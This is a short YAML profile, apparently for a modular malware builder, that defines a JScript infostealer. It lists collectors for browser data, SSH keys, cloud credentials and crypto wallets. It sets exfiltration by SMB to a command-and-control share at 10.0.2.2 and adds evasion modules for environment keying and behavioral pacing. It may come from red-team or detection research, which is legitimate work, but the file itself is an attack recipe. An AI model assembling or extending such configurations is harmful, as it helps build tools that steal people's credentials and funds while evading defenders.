name: js_infostealer_smb
description: JScript infostealer with SMB exfil for lateral movement scenarios
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/crypto_wallets

exfil: exfil/smb_write
arch: arch/sequential

evasion:
  - evasion/env_keying
  - evasion/behavioral_pacing

vars:
  C2_SHARE: "\\\\10.0.2.2\\share"
